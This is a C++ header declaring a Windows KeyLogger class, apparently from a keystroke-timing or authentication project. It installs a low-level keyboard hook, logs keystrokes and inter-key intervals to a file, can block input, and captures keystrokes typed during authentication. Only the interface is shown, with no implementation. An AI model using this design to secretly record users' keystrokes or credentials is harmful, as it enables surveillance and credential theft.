#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

// Windows API includes
#include <windows.h>

// Standard library includes
#include <chrono>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <vector>
#include <sstream>
#include <ctime>
#include <string>

class KeyLogger
{
private:
    // Handle to the keyboard hook
    HHOOK keyboardHook;

    // Indicate whether to block input
    bool blockInput;

    // File stream for saving logged key information
    std::ofstream logFile;

    // Records the time of the last key press
    std::chrono::steady_clock::time_point lastKeyPressTime;

    // Stores intervals (in ms) between consecutive key presses
    std::vector<int> recentIntervals;

    // Authentication tracking
    bool capturingAuthInput;
    std::string currentAuthInput;
    std::string authDeviceId;

    // Static callback function for the low-level keyboard hook
    static LRESULT CALLBACK KeyStrokeLogger(int nCode, WPARAM wParam, LPARAM lParam);

    // Helper method to log the key press to file
    void LogKeyStroke(DWORD vkCode, int interval);

    // Helper method to process keystroke during authentication
    void ProcessAuthenticationKeyStroke(DWORD vkCode);

    // Authentication support - handled separately in key_logger_auth.cpp
    friend void StartKeyboardCapture(const std::string& deviceId, HWND dialogWindow);
    friend void StopKeyboardCapture();
    friend LRESULT CALLBACK AuthKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

public:
    KeyLogger();
    ~KeyLogger();

    // Singleton pattern
    static KeyLogger& GetInstance();

    // Install the keyboard hook and open the log file
    void Start();

    // Remove the keyboard hook and close the log file
    void Stop();

    // Set the block input flag
    void SetBlockInput(bool block);

    // Get the block input flag
    bool GetBlockInput();

    // Start capturing keystrokes for authentication
    void StartAuthCapture(const std::string& deviceId);

    // Stop capturing keystrokes for authentication
    void StopAuthCapture();

    // Check if currently capturing authentication input
    bool IsCapturingAuth() const { return capturingAuthInput; }
};

#endif // KEY_LOGGER_H
